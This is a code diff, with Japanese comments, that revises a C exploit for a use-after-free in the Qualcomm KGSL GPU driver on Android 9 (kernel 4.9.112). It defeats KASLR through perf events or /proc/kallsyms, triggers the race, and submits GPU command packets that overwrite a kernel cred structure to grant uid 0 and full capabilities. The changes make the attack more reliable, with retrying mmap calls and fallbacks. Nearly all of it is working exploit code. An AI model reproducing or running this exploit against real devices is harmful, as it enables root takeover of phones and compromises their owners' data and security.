@@ -1,3 +1,4 @@
+// exploit.c – KGSL UAF 権限昇格 (Android 9 / kernel 4.9.112) – 修正版
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -22,6 +23,7 @@
 
 #include "target.h"
 
+// ========== KGSL 構造体 ==========
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -71,8 +73,8 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-// ========== アドレスレイアウト (ユーザー空間) ==========
-#define UAF_ADDR         0x7001ff000ULL
+// ========== アドレスレイアウト ==========
+static uint64_t UAF_ADDR   = 0x7001ff000ULL;
 #define UAF_SIZE         0x10004000ULL
 #define OVERLAP_ADDR     0x7001fe000ULL
 #define OVERLAP_SIZE     0x7000ULL
@@ -81,21 +83,19 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-// ========== スキャン定数 ==========
 #define SPRAY_PIDS       2000
-#define SCAN_DWORDS      560   // 0x8C0 バイトまでスキャン (comm 0x8F0, cred 0x838)
+#define SCAN_DWORDS      560
 
-// ========== グローバル ==========
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static volatile int dc_civac_works = -1;
-static uint64_t kaslr_offset = 0;   // ランタイム検出
+static uint64_t kaslr_offset = 0;
 
-// ========== 関数プロトタイプ ==========
+// ========== プロトタイプ ==========
 static void die(const char *msg);
 static uint64_t detect_kaslr(void);
 static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags);
-static void *gpuobj_mmap(int fd, size_t size, unsigned int id);
+static void *gpuobj_mmap_safe(int fd, size_t size, unsigned int id, void *addr, int flags);
 static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags);
 static void gpuobj_free(int fd, unsigned int id);
 static unsigned int create_context(int fd);
@@ -135,8 +135,8 @@ static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int grou
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
-// KASLR 検出 (perf_event_open または /proc/kallsyms フォールバック)
 static uint64_t detect_kaslr(void) {
+    // 方法1: perf_event_open (ハードウェア)
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
     pe.size = sizeof(pe);
@@ -147,63 +147,68 @@ static uint64_t detect_kaslr(void) {
     pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) goto fallback;
+    if (fd >= 0) {
+        int npages = 256;
+        size_t mmap_size = (1 + npages) * 4096;
+        void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+        if (buf != MAP_FAILED) {
+            ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+            ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+            usleep(500000);
+            ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
-    int npages = 256;
-    size_t mmap_size = (1 + npages) * 4096;
-    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); goto fallback; }
+            struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
+            uint64_t head = pmp->data_head;
+            uint64_t tail = pmp->data_tail;
+            uint8_t *data = (uint8_t *)buf + pmp->data_offset;
+            uint64_t data_size = pmp->data_size;
+            uint64_t first_ip = 0;
+            int n = 0;
 
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-    usleep(500000);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+            while (tail < head) {
+                uint64_t idx = tail & (data_size - 1);
+                struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
+                if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
+                    n++;
+                    uint64_t ip = *(uint64_t *)(hdr + 1);
+                    if (first_ip == 0) first_ip = ip;
+                    if (n <= 3) printf("    IP[%d]=0x%lX\n", n, (unsigned long)ip);
+                }
+                tail += hdr->size;
+            }
 
-    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
-    uint64_t head = pmp->data_head;
-    uint64_t tail = pmp->data_tail;
-    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
-    uint64_t data_size = pmp->data_size;
-    uint64_t first_ip = 0;
-    int n = 0;
-
-    while (tail < head) {
-        uint64_t idx = tail & (data_size - 1);
-        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
-        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
-            n++;
-            uint64_t ip = *(uint64_t *)(hdr + 1);
-            if (first_ip == 0) first_ip = ip;
-            if (n <= 3) printf("    IP[%d]=0x%lX\n", n, (unsigned long)ip);
+            munmap(buf, mmap_size);
+            close(fd);
+            if (n > 0) {
+                uint64_t kaslr = (first_ip - KIMAGE_TEXT_BASE) & ~KASLR_MASK;
+                printf("[+] KASLR offset = 0x%lX (perf)\n", (unsigned long)kaslr);
+                return kaslr;
+            }
         }
-        tail += hdr->size;
+        close(fd);
     }
 
-    munmap(buf, mmap_size); close(fd);
-    if (n == 0) goto fallback;
-
-    uint64_t kaslr = (first_ip - KIMAGE_TEXT_BASE) & ~KASLR_MASK;
-    printf("[+] KASLR offset = 0x%lX (from perf)\n", (unsigned long)kaslr);
-    return kaslr;
-
-fallback:
-    printf("[*] fallback: reading /proc/kallsyms\n");
+    // 方法2: /proc/kallsyms から _text を取得
+    printf("[*] Trying /proc/kallsyms...\n");
     FILE *fp = fopen("/proc/kallsyms", "r");
-    if (!fp) return 0;
-    char line[256];
-    uint64_t addr = 0;
-    while (fgets(line, sizeof(line), fp)) {
-        if (strstr(line, " _text")) {
-            sscanf(line, "%lx", &addr);
-            break;
+    if (fp) {
+        char line[256];
+        uint64_t addr = 0;
+        while (fgets(line, sizeof(line), fp)) {
+            if (strstr(line, " _text")) {
+                sscanf(line, "%lx", &addr);
+                break;
+            }
+        }
+        fclose(fp);
+        if (addr) {
+            uint64_t kaslr = (addr - KIMAGE_TEXT_BASE) & ~KASLR_MASK;
+            printf("[+] KASLR offset = 0x%lX (kallsyms)\n", (unsigned long)kaslr);
+            return kaslr;
         }
     }
-    fclose(fp);
-    if (addr) {
-        uint64_t kaslr = (addr - KIMAGE_TEXT_BASE) & ~KASLR_MASK;
-        printf("[+] KASLR offset = 0x%lX (from kallsyms)\n", (unsigned long)kaslr);
-        return kaslr;
-    }
+
+    printf("[-] KASLR detection failed, assuming 0\n");
     return 0;
 }
 
@@ -214,9 +219,18 @@ static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     return a.id;
 }
 
-static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
-    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
-    if (p == MAP_FAILED) die("gpuobj_mmap");
+static void *gpuobj_mmap_safe(int fd, size_t size, unsigned int id, void *addr, int flags) {
+    uint64_t offset = (uint64_t)id * 4096;
+    if (offset > INT64_MAX) {
+        fprintf(stderr, "[-] Offset 0x%lx too large for off_t\n", offset);
+        return MAP_FAILED;
+    }
+    void *p = mmap(addr, size, PROT_READ | PROT_WRITE,
+                   flags, fd, (off_t)offset);
+    if (p == MAP_FAILED) {
+        fprintf(stderr, "mmap(addr=%p, size=0x%zx, off=0x%lx) failed: %s (errno=%d)\n",
+                addr, size, offset, strerror(errno), errno);
+    }
     return p;
 }
 
@@ -251,7 +265,6 @@ static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
     return -2;
 }
 
-// ========== PM4 パケット生成 ==========
 static uint32_t pm4_parity(uint32_t v) {
     return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
@@ -283,7 +296,6 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-// ========== レーススレッド ==========
 static void *race_thread(void *arg) {
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
     struct kgsl_gpuobj_import imp = {
@@ -294,17 +306,16 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
-// ========== main ==========
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
     // 1. KASLR 検出
     kaslr_offset = detect_kaslr();
     if (kaslr_offset == 0) {
-        printf("[-] KASLR detection failed, using 0 (might crash)\n");
+        printf("[*] KASLR offset set to 0 (may be incorrect)\n");
     }
 
-    // 2. KGSL デバイスオープン
+    // 2. KGSL オープン
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open /dev/kgsl-3d0");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
@@ -317,17 +328,29 @@ int main(int argc, char **argv) {
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
 
     int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
-    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_m == MAP_FAILED) die("mmap UAF");
-    munmap(uaf_m, UAF_SIZE);
+    printf("  uaf_id = %u (0x%x)\n", uaf_id, uaf_id);
+
+    // 既存マッピング解除
+    munmap((void*)UAF_ADDR, UAF_SIZE);
+
+    void *uaf_m = gpuobj_mmap_safe(kgsl_fd, UAF_SIZE, uaf_id, (void*)UAF_ADDR,
+                                   MAP_SHARED | MAP_FIXED);
+    if (uaf_m == MAP_FAILED) {
+        printf("[*] Retrying without MAP_FIXED...\n");
+        uaf_m = gpuobj_mmap_safe(kgsl_fd, UAF_SIZE, uaf_id, NULL, MAP_SHARED);
+        if (uaf_m == MAP_FAILED) die("mmap UAF (retry)");
+        UAF_ADDR = (uint64_t)uaf_m;
+        printf("[+] UAF mapped at 0x%lx (without FIXED)\n", (unsigned long)UAF_ADDR);
+    } else {
+        printf("[+] UAF mapped at 0x%lx\n", (unsigned long)UAF_ADDR);
+    }
 
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
     int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
+    void *ph_m = gpuobj_mmap_safe(kgsl_fd, PLACEHOLDER_SIZE, ph_id, (void*)PLACEHOLDER_ADDR,
+                                  MAP_SHARED | MAP_FIXED);
     if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
 
     printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
@@ -412,12 +435,14 @@ int main(int argc, char **argv) {
     printf("  context=%u\n", ctx_id);
 
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
-    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
+    void *ib_m = gpuobj_mmap_safe(kgsl_fd, 0x10000, ib_id, NULL, MAP_SHARED);
+    if (ib_m == MAP_FAILED) die("mmap IB");
     uint64_t ib_ga = 0; gpuobj_info(kgsl_fd, ib_id, &ib_ga, NULL);
     printf("  IB gpuaddr=0x%lx\n", (unsigned long)ib_ga);
 
     int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
-    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
+    void *dst_m = gpuobj_mmap_safe(kgsl_fd, 0x4000, dst_id, NULL, MAP_SHARED);
+    if (dst_m == MAP_FAILED) die("mmap DST");
     uint64_t dst_ga = 0; gpuobj_info(kgsl_fd, dst_id, &dst_ga, NULL);
     printf("  DST gpuaddr=0x%lx\n", (unsigned long)dst_ga);
 
@@ -504,7 +529,6 @@ int main(int argc, char **argv) {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
 
-        // security ポインタ設定
         if (inc_sec != 0) {
             uint32_t zl, zh;
             split64(cbase + 0x78, &zl, &zh);
@@ -514,16 +538,15 @@ int main(int argc, char **argv) {
             cmd[dw++] = zl; cmd[dw++] = zh;
         }
 
-        // uid=0 + フルケイパビリティ (cred+0x04 から 21 DW)
         uint32_t zl, zh;
         split64(cbase + 0x04, &zl, &zh);
         cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
         cmd[dw++] = zl; cmd[dw++] = zh;
-        for (int i = 0; i < 8; i++) cmd[dw++] = 0;   // uid, gid, suid, ...
-        cmd[dw++] = 0x00000004;                      // セキュリティフラグ
+        for (int i = 0; i < 8; i++) cmd[dw++] = 0;
+        cmd[dw++] = 0x00000004;
         cmd[dw++] = 0; cmd[dw++] = 0;
         for (int i = 0; i < 3; i++) {
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;  // ケイパビリティ
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
         }
         cmd[dw++] = 0; cmd[dw++] = 0;
 
